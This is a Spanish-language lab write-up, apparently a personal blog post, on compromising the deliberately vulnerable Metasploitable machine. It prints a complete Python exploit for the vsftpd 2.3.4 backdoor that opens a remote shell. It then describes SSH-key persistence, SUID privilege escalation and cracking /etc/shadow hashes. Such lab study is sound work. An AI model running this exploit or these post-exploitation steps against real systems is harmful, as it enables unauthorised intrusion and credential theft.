---
{"-publish":true,"permalink":"/linux/metasploitable/","PassFrontmatter":true}
---


Es una `máquina` diseñada para para probar herramientas de `seguridad` y demostrar `vulnerabilidades` comunes.

- SO: Ubuntu Linux
- Vulnerabilidades intencionadas

---
## Que es una IP?

Una dirección `IP` es un identificador numérico único asignado a cada dispositivo conectado a una red, funciona como una especie de "*dirección*" para que los dispositivos puedan encontrarse y comunicarse entre sí dentro de la `red`. También es posible cambiar una dirección IP, dependiendo de si se trata de una IP `pública` o `privada`.

- IP pública: Una dirección que identifica tu red
- IP privada: Una dirección que identifica un dispositivo

![Pasted image 20250615181619.png](/img/user/Pasted%20image%2020250615181619.png)

## Que es ARP?

`ARP` es un *protocolo* que se utiliza para asignar direcciones `MAC` a direcciones IP en una red de área local (LAN). Esto funciona como un `traductor/intérprete` entre el protocolo de internet (IP) y la capa de enlace de datos (MAC). Es esencial para que los dispositivos se comuniquen dentro de la red, ya que las direcciones IP son lógicas y las direcciones MAC son físicas.
![Pasted image 20250615193448.png](/img/user/Pasted%20image%2020250615193448.png)

## Que es el ARP-SCAN?

Ya hablamos del protocolo ARP, ahora vamos a ver la herramienta utilizada para los protocolos ARP.
Es una herramienta de línea de comandos que se utiliza para descubrir hosts en una red local enviando paquetes `Addres Resolution Protocol` y analizando sus respuestas. Permitiendo a los usuarios identificar dispositivos activos y sus direcciones MAC y IP dentro de la red.

##### Como funciona?
- Si un dispositivo en la red está utilizando esa dirección IP, responderá con una solicitud ARP de vuelta, indicando su dirección MAC.
- `arp-scan` recopila estas respuestas y muestra la información del dispositivo, incluyendo su dirección IP y MAC.
- Envía solicitud ARP con la dirección IP de destino a cada dirección IP dentro de un rango especificado

Ejemplo:
![Pasted image 20250615194102.png](/img/user/Pasted%20image%2020250615194102.png)

---

## Que es Netcat?

`Netcat` es una herramienta de línea de comandos que sirve para escribir y leer datos en la red. Conocida por ser la `navaja suiza de las redes` debido a que podemos hacer transferencia de datos a través de los protocolos `TCP/UDP`, su funcionamiento depende de que la comunicación IP entre dispositivos esté correctamente establecida. Aquí es donde entra el protocolo ARP (`Address Resolution Protocol`), que trabaja en la capa de enlace de datos. ARP se encarga de resolver direcciones IP a direcciones MAC dentro de una red local. Cuando usas *Netcat* para conectarte a otra máquina en la misma red, primero se realiza una consulta ARP para saber a qué dirección MAC enviar los paquetes. Sin una resolución ARP exitosa, la conexión de Netcat no podría establecerse.

Ejemplo
![Pasted image 20250615195303.png](/img/user/Pasted%20image%2020250615195303.png)

---

## Escaneo y Enumeración:

Usaremos NMAP para para escanear los puertos abiertos y así poder identificar servicios en ejecución.

![Pasted image 20250615200116.png](/img/user/Pasted%20image%2020250615200116.png)

Como vector de ataque podríamos probar la versión del FTP en el cual si buscamos en internet tenemos varios documentos e informes acerca de la vulnerabilidad `vstftpd 2.3.4` en el cuál el exploit consiste en un `backdoor` que fue introducido por un atacante en el código fuente oficial del servidor FTP vsftpd. Este exploit permite al atacante obtener una shell remota en el servidor vulnerable.

código del exploit:
``` python
# Exploit Title: vsftpd 2.3.4 - Backdoor Command Execution
# Date: 9-04-2021
# Exploit Author: HerculesRD
# Software Link: http://www.linuxfromscratch.org/~thomasp/blfs-book-xsl/server/vsftpd.html
# Version: vsftpd 2.3.4
# Tested on: debian
# CVE : CVE-2011-2523

#!/usr/bin/python3   
                                                           
from telnetlib import Telnet 
import argparse
from signal import signal, SIGINT
from sys import exit

def handler(signal_received, frame):
    # Handle any cleanup here
    print('   [+]Exiting...')
    exit(0)

signal(SIGINT, handler)                           
parser=argparse.ArgumentParser()        
parser.add_argument("host", help="input the address of the vulnerable host", type=str)
args = parser.parse_args()       
host = args.host                        
portFTP = 21 #if necessary edit this line

user="USER nergal:)"
password="PASS pass"

tn=Telnet(host, portFTP)
tn.read_until(b"(vsFTPd 2.3.4)") #if necessary, edit this line
tn.write(user.encode('ascii') + b"\n")
tn.read_until(b"password.") #if necessary, edit this line
tn.write(password.encode('ascii') + b"\n")

tn2=Telnet(host, 6200)
print('Success, shell opened')
print('Send `exit` to quit shell')
tn2.interact()

```

### Claves ID_RSA?
Es una clave privada del protocolo SSH, utilizado para autenticarse sin necesidad de una contraseña. Esto mismo sería para aplicar persistencia en la máquina.
![Pasted image 20250615204510.png](/img/user/Pasted%20image%2020250615204510.png)

Para ello, luego de mantener persistencia en la máquina podríamos elevar privilegios de manera local.

Como recurso de escalado de privilegios tenemos esta página llamada [GTFoBins](https://gtfobins.github.io) y [HackTricks](https://book.hacktricks.wiki/es/index.html) para múltiples técnicas de Hacking Ético.

Ejemplo de explotación de binarios SUID:
![Pasted image 20250615205929.png](/img/user/Pasted%20image%2020250615205929.png)

En la página de GTFoBins, tenemos varias técnicas de explotación de binarios SUID para buscar cual es la más acorde para escalar privilegios.

![Pasted image 20250615210130.png](/img/user/Pasted%20image%2020250615210130.png)

Luego de copiar el SUID correcto, queda elevar nuestros privilegios:
![Pasted image 20250615210243.png](/img/user/Pasted%20image%2020250615210243.png)
Y listo, ya somos ROOT, pero? no sabemos la contraseña de ROOT, ya que ahora tenemos privilegios máximos en el sistema podemos leer el archivo **/etc/shadow**

![Pasted image 20250615210515.png](/img/user/Pasted%20image%2020250615210515.png)
Y si nos damos cuenta la contraseña esta formato **HASH**, a lo cual nosotros tendremos que intentar fusionar los archivos `/etc/passwd` y `/etc/shadow` para que pueda ser entendido por herramientas de `crackeo de contraseñas` por ejemplo, `John The Ripper` y/o `Hashcat`, etc. Lo podemos realizar con el comando *unshadow*.

Luego podríamos almacenar estas credenciales obtenidas en unas notas de nuestra maquina principal por si en algún momento queremos mantener la persistencia del usuario ROOT.

## Que aprendimos?

Aprende que no todos las aplicaciones son seguras realmente, pudimos ingresar al protocolo `FTP` mediante un exploit que está en internet (*debido a que una empresa fue comprometida externamente*) más especifico mediante un `Backdoor` y hemos logrado mantener persistencia dentro de la maquina, haciendo uso de llaves privadas ID_RSA, luego intentamos elevar nuestros privilegios a lo cual mediante los SIUD mal configurados logramos obtener acceso máximo como ROOT y logramos leer las contraseñas de todos los usuarios de la máquina.


![fin.gif](/img/user/fin.gif)
